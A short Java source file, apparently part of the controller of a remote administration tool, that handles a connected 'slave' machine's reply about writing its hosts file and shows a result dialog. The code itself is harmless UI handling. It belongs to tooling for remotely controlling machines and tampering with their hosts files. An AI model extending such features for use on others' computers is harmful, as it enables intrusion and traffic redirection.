package com.redpois0n.packets;

import javax.swing.JOptionPane;

import com.redpois0n.Slave;
import com.redpois0n.ui.frames.FrameControlPanel;
import com.redpois0n.ui.panels.PanelControlHostsFile;


public class PacketHOSTANSW extends AbstractPacket {

	@Override
	public void read(Slave slave, String line) throws Exception {
		String answer = slave.readLine();
		FrameControlPanel frame = FrameControlPanel.instances.get(slave);
		if (frame != null) {
			PanelControlHostsFile panel = (PanelControlHostsFile) frame.panels.get("hosts file");
			if (panel.waitingAnswer) {
				if (answer.startsWith("ERR: ")) {
					answer = answer.substring(5, answer.length());
					JOptionPane.showMessageDialog(null, "Failed writing hosts file:\n\n" + answer, "Error", JOptionPane.ERROR_MESSAGE);
				} else {
					JOptionPane.showMessageDialog(null, answer, "Hosts file", JOptionPane.INFORMATION_MESSAGE);
				}
				panel.waitingAnswer = false;
			}
		}
	}

}
